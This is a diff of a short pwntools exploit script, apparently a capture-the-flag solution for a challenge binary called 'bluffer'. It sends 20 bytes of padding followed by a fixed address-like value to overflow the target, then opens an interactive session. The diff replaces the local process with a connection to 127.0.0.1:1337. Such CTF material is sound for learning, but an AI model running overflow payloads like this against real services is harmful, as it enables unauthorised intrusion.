@@ -1,13 +1,15 @@
 from pwn import *
 
-p = process("./bluffer")
-# p = remote("HOST", PORT) # modified after competition
+p = remote("127.0.0.1", 1337)
+offset = 20
 
-ngab = hex(5134160)[2:]
+payload = flat({
+	offset : [
+		5134160
+	]
+})
 
-pay = cyclic(20)
-pay += bytes.fromhex(ngab)[::-1]
 
-p.sendline(pay)
+p.sendline(payload)
 
 p.interactive()
